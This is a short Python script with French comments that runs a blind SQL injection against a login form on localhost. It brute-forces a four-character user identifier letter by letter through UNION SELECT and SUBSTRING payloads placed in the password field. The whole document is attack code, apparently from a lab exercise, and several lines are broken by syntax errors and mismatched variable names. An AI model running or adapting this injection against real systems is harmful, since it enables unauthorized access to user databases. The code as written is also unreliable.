#!C:\Python36/python.exe
#script injection pour nombre de champs
import httplib, urllib
site="127.0.0.1"
port=80
page"/path"
cara='qwertyuiopasdfghjklzxcvbnm'
login =''
for n in range(1,5):
    for c in range(0,27):
        injection="'UNION SELECT nom,prenom FROM utilisateurs WHERE LENGTH(identifiant)=4 AND SUBSTRING(identifiant,1,"+str(n)+")='"+login+cara[c:c+1]+"'#";
        print(injection)
        paramaters=urllib.URLencode{'identif':'koreth','mdp':injection,'ref':'identification','valider':'Valider'})}
        headers={"Content-type":"application/x-www-form-urlencoded","Accept":"text/plain"}
        conn = httplib.HTTPConnection(site+":"+str(port))
        conn.request("POST",page,parameters,headers)
        rep=conn.getresponse();
        page_retour= rep.read()
        if 'Verfiez ' in page_retour:
            login =login+carac[c:c+1]
            break
        print("Le login est :" ,login)
conn.close()
